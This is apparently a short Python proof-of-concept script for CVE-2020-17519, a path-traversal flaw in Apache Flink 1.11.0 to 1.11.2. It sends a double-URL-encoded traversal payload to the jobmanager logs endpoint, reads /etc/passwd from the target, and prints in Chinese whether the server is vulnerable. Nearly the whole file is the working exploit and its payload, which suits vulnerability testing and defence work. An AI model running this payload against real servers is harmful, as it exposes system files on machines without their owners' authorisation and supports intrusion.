#!/usr/bin/env python
# coding:utf-8
# author:B1anda0
#affected versions are Apache Flink 1.11.0-1.11.2

import requests,sys,colorama
from  module import  color_one
from colorama import *
init(autoreset=True)
url=''
def verify():

	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
	payload= '/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd'
	poc=url+payload
	try:
		requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告
		response=requests.get(poc,headers=headers,timeout=15,verify=False)
		if response.status_code==200 and "root:x" in response.content:
			print(color_one.green+'存在CVE-2020-17519漏洞'+color_one.end)
		else:
			print(color_one.red+' 不存在CVE-2020-17519漏洞'+color_one.end)
	except:
		print(color_one.red + ' 不存在CVE-2020-17519漏洞'+color_one.end)
